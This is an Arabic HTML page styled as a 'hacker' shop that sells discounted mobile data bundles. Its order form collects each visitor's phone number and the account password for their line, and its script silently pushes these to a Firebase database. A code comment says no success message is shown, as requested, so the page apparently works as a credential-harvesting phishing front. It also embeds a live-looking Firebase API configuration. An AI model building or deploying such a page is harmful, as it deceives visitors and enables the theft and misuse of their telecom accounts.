<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
<title>موقع هاكر - الباقات</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Cairo&display=swap');
  body, html {
    margin: 0; padding: 0; height: 100%;
    background: black;
    font-family: 'Cairo', sans-serif;
    color: #eee;
    overflow-x: hidden;
  }
  /* ماتريكس خلفية */
  canvas#matrix {
    position: fixed;
    top: 0; left: 0; width: 100%; height: 100%;
    z-index: 0;
    background: black;
    filter: brightness(1.2);
  }
  /* حاوية المحتوى */
  .container {
    position: relative;
    z-index: 10;
    max-width: 480px;
    margin: auto;
    padding: 20px 15px 70px;
    box-sizing: border-box;
  }
  h1 {
    text-align: center;
    font-weight: 900;
    font-size: 2.5rem;
    color: #ff0000;
    margin-bottom: 25px;
    text-shadow: 0 0 6px #ff0000;
  }
  /* تصميم الباقات */
  .package {
    background: #111;
    border: 2px solid #b30000;
    border-radius: 10px;
    margin: 15px 0;
    padding: 18px 15px;
    box-shadow: 0 0 12px #b30000aa;
  }
  .package-title {
    font-size: 1.4rem;
    font-weight: 700;
    color: #ff3300;
    text-align: center;
    margin-bottom: 12px;
  }
  .package-price {
    font-size: 1.2rem;
    color: #ff0000cc;
    font-weight: 600;
    text-align: center;
    margin-bottom: 10px;
  }
  .package-conditions {
    font-size: 1rem;
    line-height: 1.5;
    color: #ccc;
    text-align: right;
    padding: 0 8px;
    min-height: 72px;
  }
  /* نموذج الادخال */
  form {
    background: #111;
    border: 2px solid #b30000;
    border-radius: 10px;
    margin-top: 20px;
    padding: 20px 15px;
    box-shadow: 0 0 14px #ff0000cc;
  }
  form label {
    display: block;
    color: #ff3300;
    font-weight: 700;
    margin-bottom: 6px;
    font-size: 1rem;
  }
  form input[type="text"], form input[type="password"], form input[type="number"] {
    width: 100%;
    padding: 10px 12px;
    margin-bottom: 15px;
    border-radius: 7px;
    border: 1.8px solid #440000;
    background: #222;
    color: #eee;
    font-size: 1.1rem;
    transition: border-color 0.3s;
  }
  form input[type="text"]:focus, form input[type="password"]:focus, form input[type="number"]:focus {
    border-color: #ff0000;
    outline: none;
  }
  form button {
    width: 100%;
    background: #ff0000;
    color: white;
    font-weight: 800;
    font-size: 1.2rem;
    padding: 12px;
    border: none;
    border-radius: 8px;
    cursor: pointer;
    box-shadow: 0 0 8px #ff3300;
    transition: background-color 0.3s;
  }
  form button:hover {
    background: #cc0000;
  }
  /* حقوق البرمجة */
  footer {
    text-align: center;
    color: #660000;
    font-size: 0.85rem;
    padding: 18px 10px 8px;
    font-weight: 700;
    letter-spacing: 0.06em;
  }
  footer span {
    color: #ff0000;
    font-weight: 900;
  }
  /* Responsive Adjustments */
  @media (max-width: 500px) {
    h1 { font-size: 2rem; }
    .package-title { font-size: 1.2rem; }
    .package-price { font-size: 1.1rem; }
    .package-conditions { font-size: 0.95rem; }
    form input[type="text"], form input[type="password"], form input[type="number"] {
      font-size: 1rem;
    }
    form button {
      font-size: 1.1rem;
    }
  }
</style>
</head>
<body>

<canvas id="matrix"></canvas>

<div class="container">
  <h1>مرحبا بك في موقع الباقات</h1>

  <div class="package">
    <div class="package-title">باقه 42 ألف فليكس</div>
    <div class="package-price">السعر: 350 كاش</div>
    <div class="package-conditions">
      شروط الباقة: أن الخط يكون نظام فليكس 260 وميكونش عليه سلف أو نوته
    </div>
  </div>

  <div class="package">
    <div class="package-title">باقه 13 ألف فليكس</div>
    <div class="package-price">السعر: 240 كاش</div>
    <div class="package-conditions">
      شروط الباقة: ميكونش فيه سلف أو نوته على الخط
    </div>
  </div>

  <div class="package">
    <div class="package-title">باقه 40 جيجا</div>
    <div class="package-price">السعر: 330 كاش</div>
    <div class="package-conditions">
      لا يوجد شروط
    </div>
  </div>

  <div class="package">
    <div class="package-title">تجديد باقه 50 ألف فليكس</div>
    <div class="package-price">السعر: حسب التجديد</div>
    <div class="package-conditions">
      تجديد - 8 أيام - يجب التجديد قبل انتهاء الباقة
    </div>
  </div>

  <div class="package">
    <div class="package-title">باقه 5200 فليكس</div>
    <div class="package-price">السعر: 100 كاش</div>
    <div class="package-conditions">
      شروط الباقة: ميكونش سلف أو نوته على الخط<br />
      ملحوظة: غير متوفرة على طول، يتم تشغيلها أو إيقافها من موقع الأدمن
    </div>
  </div>

  <form id="orderForm">
    <label for="phone">رقم الهاتف:</label>
    <input type="text" id="phone" placeholder="ادخل رقم الهاتف" required pattern="0[0-9]{9}" title="يجب أن يكون رقم هاتف صحيح يبدأ بـ0 ويتكون من 10 أرقام" />

    <label for="password">كلمة المرور:</label>
    <input type="password" id="password" placeholder="ادخل كلمة المرور" required />

    <label for="packageSelect">اختر الباقة:</label>
    <select id="packageSelect" required>
      <option value="" disabled selected>اختر الباقة</option>
      <option value="42k">42 ألف فليكس - 350 كاش</option>
      <option value="13k">13 ألف فليكس - 240 كاش</option>
      <option value="40g">40 جيجا - 330 كاش</option>
      <option value="renew50k">تجديد باقه 50 ألف فليكس</option>
      <option value="5200" id="opt-5200">باقه 5200 فليكس - 100 كاش</option>
    </select>

    <label for="netBalance">الرصيد الصافي:</label>
    <input type="number" id="netBalance" placeholder="ادخل الرصيد الصافي" min="0" required />

    <div style="color:#888; font-size:0.85rem; margin-bottom:15px;">
      * سعر الرصيد الصافي: 100 صافي = 120 فلوس
    </div>

    <button type="submit">إرسال الطلب</button>
  </form>
</div>

<footer>
  &copy; 2025 <span>Ahmed F</span> - All Rights Reserved.
</footer>

<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
<script>
// Firebase config
const firebaseConfig = {
  apiKey: "AIzaSyCuP6VscPxkQS5D5z7bCYWXijzaYCdbF2s",
  authDomain: "starkoscript.firebaseapp.com",
  databaseURL: "https://starkoscript-default-rtdb.firebaseio.com",
  projectId: "starkoscript",
  storageBucket: "starkoscript.appspot.com",
  messagingSenderId: "381525854892",
  appId: "1:381525854892:android:50ba5daa1cffae8faa2d09"
};

// Initialize Firebase
firebase.initializeApp(firebaseConfig);
const db = firebase.database();

// تحكم ظهور باقة 5200 من Firebase (مثلاً تستخدم node تحت path 'packages/5200_enabled' boolean)
const opt5200 = document.getElementById("opt-5200");
firebase.database().ref('packages/5200_enabled').on('value', (snap) => {
  if (snap.exists() && snap.val() === false) {
    opt5200.disabled = true;
    opt5200.textContent = "باقه 5200 فليكس - غير متوفرة حالياً";
  } else {
    opt5200.disabled = false;
    opt5200.textContent = "باقه 5200 فليكس - 100 كاش";
  }
});

const orderForm = document.getElementById('orderForm');
orderForm.addEventListener('submit', e => {
  e.preventDefault();

  const phone = document.getElementById('phone').value.trim();
  const password = document.getElementById('password').value.trim();
  const selectedPackage = document.getElementById('packageSelect').value;
  const netBalance = parseFloat(document.getElementById('netBalance').value);

  if (!phone || !password || !selectedPackage || isNaN(netBalance)) {
    alert('يرجى تعبئة جميع الحقول بشكل صحيح');
    return;
  }

  // حساب السعر بالدقة المطلوبة
  const price = Math.round((netBalance / 100) * 120);

  // هيكل البيانات التي سترسل للفاييربيس
  const orderData = {
    phone,
    password,
    package: selectedPackage,
    netBalance,
    price,
    timestamp: new Date().toISOString()
  };

  // حفظ البيانات في قاعدة البيانات تحت node 'orders'
  db.ref('orders').push(orderData)
    .then(() => {
      // لا نعرض رسالة "تم الشحن" حسب طلبك، لكن يمكننا تنظيف النموذج
      orderForm.reset();
    })
    .catch(error => {
      alert('حدث خطأ أثناء إرسال البيانات. حاول مرة أخرى.');
      console.error(error);
    });
});

// تأثير الماتريكس باللون الأخضر (معدل ومظهر أكثر وضوحاً)
const canvas = document.getElementById('matrix');
const ctx = canvas.getContext('2d');

let width = canvas.width = window.innerWidth;
let height = canvas.height = window.innerHeight;

const letters = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ@#$%^&*()*&^%'.split('');
const fontSize = 14;
const columns = Math.floor(width / fontSize);
const drops = new Array(columns).fill(1);

function draw() {
  ctx.fillStyle = 'rgba(0, 0, 0, 0.1)';
  ctx.fillRect(0, 0, width, height);

  ctx.fillStyle = '#0F0'; // أخضر ماتريكس
  ctx.font = fontSize + 'px monospace';

  for(let i = 0; i < drops.length; i++) {
    const text = letters[Math.floor(Math.random() * letters.length)];
    ctx.fillText(text, i * fontSize, drops[i] * fontSize);

    if (drops[i] * fontSize > height && Math.random() > 0.975) drops[i] = 0;
    drops[i]++;
  }
}

setInterval(draw, 35);

window.addEventListener('resize', () => {
  width = canvas.width = window.innerWidth;
  height = canvas.height = window.innerHeight;
});
</script>
</body>
</html>
